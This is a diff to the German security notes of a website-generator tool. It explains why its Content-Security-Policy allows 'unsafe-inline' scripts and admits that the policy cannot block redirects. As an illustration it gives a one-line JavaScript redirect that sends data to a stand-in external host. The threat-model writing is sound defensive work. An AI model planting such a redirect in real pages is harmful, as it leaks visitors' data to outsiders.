@@ -418,6 +418,8 @@ Die CLI kennt außerdem `regoro init <site> --stdin` (Kontaktwege aus stdin, ein
 - Kein Passwort, also auch kein Passwort zum Erraten. Der Einmalcode ist sechsstellig, gilt 5 Minuten und verträgt 5 Fehleingaben — 10⁶ Möglichkeiten bleiben damit unerreichbar. Codes und Bremszähler leben nur im Arbeitsspeicher und stehen in keinem Log.
 - Der KI-Agent (falls eingerichtet) schreibt nie direkt in die Website, sondern in eine Kopie außerhalb des Site-Ordners; übernommen wird nur, was die Prüfung besteht. Er hält keine Zugangsschlüssel und hat kein Werkzeug für beliebige Netzverbindungen — Suche, Seitenabruf und Modellaufruf laufen über den Elternprozess.
 - Der Caddy-Block setzt auf der ausgelieferten Website eine **Content-Security-Policy** mit `connect-src 'none'`: Was auch immer auf einer Seite landet, kann im Browser des Besuchers nichts nach außen schicken. Sie steht bewusst im Proxy und nicht im HTML — dort könnte der Agent sie umschreiben.
+  - **`'unsafe-inline'` bei `script-src` ist ein bewusster Kompromiss**, kein Versehen. Die Fabrik liefert Inline-Skripte aus (Kopfzeile gegen Layout-Sprung, JSON-LD). An echten Kundenseiten dreimal unabhängig nachgezählt: 8, 12 und 13 Blöcke — die Zahl schwankt je Seite, aber **keiner davon hat ein `src`**. Ohne `'unsafe-inline'` wäre jeder einzelne tot und die Seiten kaputt. Die Härtung wäre, die bekannten Fabrik-Skripte je Site per Hash zu erlauben; das ist notiert, aber nicht gebaut.
+  - **Was die CSP nicht verhindert:** eine Weiterleitung (`location = "https://fremd/?daten"`). Dafür gibt es keine Direktive. Das ist ein sichtbarer Angriff, kein stiller, und über die Versionsliste in einem Klick zurückgenommen.
 
 ## Lizenzhinweise
 
